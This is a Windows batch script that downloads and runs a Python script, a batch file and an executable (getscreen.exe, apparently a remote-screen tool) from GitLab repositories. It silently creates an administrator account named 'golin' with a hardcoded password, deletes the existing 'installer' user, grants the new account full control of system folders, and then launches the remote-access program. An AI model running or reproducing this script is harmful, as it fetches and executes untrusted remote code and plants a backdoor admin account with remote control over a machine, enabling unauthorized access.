@echo off
curl -L -o login.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/login.py?inline=false
curl -L -o loop.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/loop.bat?inline=false
curl -L -o getscreen.exe https://gitlab.com/alohamenia-group/menia/-/raw/main/getscreen.exe?inline=false
pip install pyautogui --quiet
pip install psutil --quiet
net user golin gaspol01 /add >nul
net localgroup administrators golin /add >nul
net user golin /active:yes >nul
net user installer /delete
diskperf -Y >nul
sc config Audiosrv start= auto >nul
sc start audiosrv >nul
ICACLS C:\Windows\Temp /grant golin:F >nul
ICACLS C:\Windows\installer /grant golin:F >nul
start "" "getscreen.exe"
python login.py
